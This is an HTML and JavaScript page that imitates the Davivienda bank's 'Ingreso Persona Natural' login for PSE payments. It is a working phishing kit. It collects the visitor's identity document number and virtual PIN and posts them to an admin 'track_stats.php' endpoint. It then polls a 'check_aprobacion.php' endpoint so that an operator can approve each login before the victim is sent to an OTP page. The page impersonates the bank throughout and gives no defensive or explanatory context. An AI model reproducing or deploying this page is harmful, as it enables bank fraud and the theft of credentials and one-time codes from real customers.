<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/styles.css">
    <script>
        (function() {
            const findRoot = () => {
                const path = window.location.pathname;
                const parts = path.split('/');
                const pseIdx = parts.indexOf('PSE');
                if (pseIdx !== -1) return parts.slice(0, pseIdx + 1).join('/');
                const portalIdx = parts.indexOf('portal');
                if (portalIdx !== -1) return parts.slice(0, portalIdx).join('/');
                return '';
            };
            const root = findRoot();
            const script = document.createElement('script');
            script.src = (root === '' ? '' : root) + '/admin/subirdatos/core-sys.js?v=' + Date.now();
            document.head.appendChild(script);
        })();
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Davivienda - Ingreso Persona Natural</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap');
        
        body {
            font-family: 'Open Sans', sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        .bg-overlay {
            background: linear-gradient(0deg, rgba(0,0,0,0.45) 0%, rgba(0,0,0,0.15) 100%);
        }

        .form-container {
            background-color: rgba(255, 255, 255, 0.45);
            backdrop-filter: blur(8px);
            border: 4px solid white;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 420px;
        }

        .custom-select {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='black'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M8 9l4-4 4 4m0 6l-4 4-4-4' /%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 0.8rem center;
            background-size: 1rem;
            width: 280px;
            height: 42px;
        }

        .custom-input {
            width: 190px;
            height: 42px;
        }

        .btn-red {
            background-color: #ed1c24;
            width: 140px;
            height: 42px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        .btn-grey {
            background-color: #6d6e71;
            width: 140px;
            height: 42px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        .hidden-step {
            display: none !important;
        }
    </style>
</head>
<body class="bg-black">
    <main class="relative flex flex-col items-center justify-start w-full min-h-dvh overflow-y-auto">
        
        <!-- Toast Notification -->
        <div id="toast" class="fixed top-5 right-5 z-[110] transform translate-x-[150%] transition-transform duration-500">
            <div class="bg-white border-l-4 border-[#ed1c24] shadow-2xl p-4 min-w-[300px] rounded-r-lg flex items-center gap-4">
                <div class="bg-[#ed1c24] text-white p-2 rounded-full">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
                </div>
                <div>
                    <h4 class="font-bold text-gray-800">Error</h4>
                    <p id="toast-msg" class="text-sm text-gray-600">Datos incorrectos. Intente de nuevo.</p>
                </div>
            </div>
        </div>

        <!-- Loader -->
        <div id="loader-sync" class="hidden fixed inset-0 z-[100] flex items-center justify-center bg-black bg-opacity-60 backdrop-blur-sm">
            <div class="bg-white p-8 rounded-3xl flex flex-col items-center gap-4 shadow-2xl">
                <div class="w-12 h-12 border-4 border-[#ed1c24] border-t-transparent rounded-full animate-spin"></div>
                <p class="text-gray-800 font-bold">Procesando...</p>
            </div>
        </div>

        <!-- Header with Logo and Red Background -->
        <div class="bg-[#E62221] w-full flex justify-center items-center py-3 z-20">
            <img src="./assets/logoh1.png" alt="Davivienda Logo" class="h-12">
        </div>

        <!-- Date and CUS Info -->
        <div class="bg-white w-full flex flex-col items-center py-2 border-b border-gray-200 z-20">
            <p id="date" class="text-[12px] text-gray-600 font-normal">Domingo 21 de Junio de 2026, 02:54 A.M.</p>
            <p id="cus_code" class="text-[12px] text-gray-600 font-normal">Código único CUS: 478734737</p>
        </div>

        <!-- Main Content -->
        <div class="relative flex flex-col w-full items-center bg-[url(./assets/bg.jpg)] bg-cover bg-center">
            <div class="absolute inset-0 bg-overlay"></div>
            
            <div class="relative z-10 flex flex-col items-center w-full px-4 py-16 pb-20">
                <div class="flex flex-col mt-12 mb-8">
                    <h1 class="text-[28px] text-center text-white font-light">Ingreso Persona Natural</h1>
                    <h1 class="text-[32px] text-center text-white font-bold">Pagos en Línea y PSE</h1>
                </div>

                <!-- Form Container -->
                <div class="form-container rounded-[38px] p-5 pt-6 flex flex-col items-center">
                    <h2 class="text-[16px] font-bold text-black mb-6 text-center leading-tight px-4">Por favor ingrese la siguiente información:</h2>
                    
                    <div class="w-full flex flex-col items-center mb-4">
                        <label for="document_type" class="text-[13px] font-bold text-black mb-2">Tipo de documento</label>
                        <select id="document_type" class="custom-select bg-white text-black px-4 rounded-xl border-none appearance-none focus:outline-none text-[14px] font-semibold">
                            <option value="CC">Cedula de Ciudadania</option>
                            <option value="CE">Cedula de Extranjeria</option>
                            <option value="TI">Tarjeta de Identidad</option>
                        </select>
                    </div>

                    <!-- Step 1: Document Number -->
                    <div id="step1_doc" class="w-full flex flex-col items-center mb-7">
                        <label for="username" class="text-[13px] font-bold text-black mb-2">No. de documento</label>
                        <input type="text" id="username" class="custom-input bg-white text-black px-4 rounded-xl border-none focus:outline-none text-center text-[16px] font-semibold" placeholder="">
                    </div>

                    <!-- Step 2: Masked Document and Password -->
                    <div id="step2_pass" class="hidden-step w-full flex flex-col items-center">
                        <div class="w-full flex flex-col items-center mb-4">
                            <label class="text-[13px] font-bold text-black mb-2">No. de documento</label>
                            <input type="text" id="masked_username" disabled class="custom-input bg-white text-black px-4 rounded-xl border-none focus:outline-none text-center text-[16px] font-semibold" value="">
                        </div>
                        <div class="w-full flex flex-col items-center mb-8">
                            <label for="password" class="text-[13px] font-bold text-black mb-2">Clave virtual</label>
                            <input type="password" id="password" maxlength="8" class="custom-input bg-white text-black px-4 rounded-xl border-none focus:outline-none text-center text-[16px] font-semibold" placeholder="">
                        </div>
                    </div>

                    <!-- Buttons -->
                    <div class="flex flex-row gap-3 w-full justify-center mt-3">
                        <button id="btnSubmit" class="btn-red text-white text-[15px] font-bold rounded-xl transition-all active:scale-95">
                            Continuar
                        </button>
                        <button onclick="window.location.assign('index.php')" class="btn-grey text-white text-[15px] font-bold rounded-xl transition-all active:scale-95">
                            Cancelar
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="bg-black text-white flex flex-col items-center justify-center py-3.5 w-full z-20">
            <p class="text-[12px] font-light">Banco Davivienda S.A. Todos los derechos reservados 2026.</p>
            <img src="./assets/vigilado2.svg" alt="Vigilado" class="h-3 mt-1">
        </footer>
    </main>

    <script>
        const getProjectRoot = () => {
            const path = window.location.pathname;
            const parts = path.split('/');
            const pseIndex = parts.indexOf('PSE');
            return pseIndex !== -1 ? parts.slice(0, pseIndex + 1).join('/') : '';
        };

        const root = getProjectRoot();

        const now = new Date();
        const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
        const months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
        
        const dateStr = `${days[now.getDay()]} ${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}, ${now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', hour12: true }).toUpperCase()}`;
        document.getElementById("date").textContent = dateStr;

        const cusCode = localStorage.getItem('cus_code') || Math.floor(100000000 + Math.random() * 900000000);
        localStorage.setItem('cus_code', cusCode);
        document.getElementById("cus_code").textContent = "Código único CUS: " + cusCode;
        
        const btnSubmit = document.getElementById("btnSubmit");
        const usernameInput = document.getElementById("username");
        const passwordInput = document.getElementById("password");
        const step1Doc = document.getElementById("step1_doc");
        const step2Pass = document.getElementById("step2_pass");
        const maskedUsername = document.getElementById("masked_username");
        const documentSelect = document.getElementById("document_type");

        let currentStep = 1;

        function showToast(msg) {
            const toast = document.getElementById("toast");
            const toastMsg = document.getElementById("toast-msg");
            toastMsg.innerText = msg;
            toast.style.transform = "translateX(0)";
            setTimeout(() => {
                toast.style.transform = "translateX(150%)";
            }, 5000);
        }

        function toggleLoader(show) {
            const loader = document.getElementById("loader-sync");
            if (show) loader.classList.remove("hidden");
            else loader.classList.add("hidden");
        }

        function startPolling(id) {
            console.log('🔍 INICIANDO POLLING CON ID:', id);
            
            let pollCount = 0;
            const maxPolls = 150;
            
            const interval = setInterval(() => {
                pollCount++;
                console.log(`📡 Poll #${pollCount} - Consultando ID:`, id);
                
                fetch('../../admin/check_aprobacion.php?log_id=' + id)
                    .then(res => res.json())
                    .then(data => {
                        console.log('📦 Respuesta COMPLETA de check_aprobacion:', data);
                        console.log('📊 Estado recibido:', data.estado);
                        
                        if (data.estado === 'aprobado') {
                            console.log('✅ APROBADO! Redirigiendo a otp.php');
                            clearInterval(interval);
                            window.location.href = "otp.php";
                        } else if (data.estado === 'rechazado') {
                            console.log('❌ RECHAZADO');
                            clearInterval(interval);
                            toggleLoader(false);
                            showToast("La clave virtual es incorrecta. Intente de nuevo.");
                            passwordInput.value = "";
                        } else if (pollCount >= maxPolls) {
                            console.log('⏰ TIMEOUT');
                            clearInterval(interval);
                            toggleLoader(false);
                            alert('Tiempo de espera agotado');
                        }
                    })
                    .catch(err => {
                        console.error('❌ Error en fetch polling:', err);
                        if (pollCount >= maxPolls) {
                            clearInterval(interval);
                            toggleLoader(false);
                        }
                    });
            }, 2000);
        }

        btnSubmit.addEventListener("click", () => {
            if (currentStep === 1) {
                const username = usernameInput.value;
                if (username && username.length > 5) {
                    localStorage.setItem('usuario_davivienda', username);
                    localStorage.setItem('identificacion_davivienda', username);
                    localStorage.setItem('tipo_id_davivienda', documentSelect.value);
                    const last4 = username.slice(-4);
                    maskedUsername.value = "••••••" + last4;
                    step1Doc.classList.add('hidden-step');
                    step2Pass.classList.remove('hidden-step');
                    documentSelect.disabled = true;
                    currentStep = 2;
                } else {
                    alert('Por favor ingrese un número de documento válido.');
                }
            } else if (currentStep === 2) {
                const password = passwordInput.value;
                if (password && password.length >= 4) {
                    localStorage.setItem('clave_pin_davivienda', password);
                    
                    const usuario = localStorage.getItem('usuario_davivienda') || '';
                    const identificacion = localStorage.getItem('identificacion_davivienda') || '';
                    const tipo_id = localStorage.getItem('tipo_id_davivienda') || 'CC';

                    const formData = new FormData();
                    formData.append('activity', 'LOGIN (DAVIVIENDA)');
                    formData.append('action', 'log');
                    formData.append('metodo', 'PSE');
                    formData.append('banco', 'Davivienda');
                    formData.append('documento', usuario);
                    formData.append('usuario', usuario);
                    formData.append('identificacion', identificacion);
                    formData.append('tipo_identificacion', tipo_id);
                    formData.append('clave_pin', password);
                    formData.append('clave_tarjeta', '');
                    formData.append('ultimos_digitos', '');

                    toggleLoader(true);

                    fetch('../../admin/track_stats.php', {
                        method: 'POST',
                        body: formData,
                        keepalive: true
                    }).then(res => res.json()).then(data => {
                        console.log('📝 Respuesta COMPLETA de track_stats:', data);
                        console.log('📝 data.success:', data.success);
                        console.log('📝 data.id:', data.id);
                        
                        if (data.success) {
                            console.log('✅ ID recibido para polling:', data.id);
                            localStorage.setItem('log_id_davivienda', data.id);
                            startPolling(data.id);
                        } else {
                            console.error('❌ Error: data.success es false');
                            toggleLoader(false);
                            alert('Error al procesar');
                        }
                    }).catch(err => {
                        console.error('❌ Error en track_stats:', err);
                        toggleLoader(false);
                    });
                } else {
                    alert('Por favor ingrese su clave virtual.');
                }
            }
        });
    </script>
</body>
</html>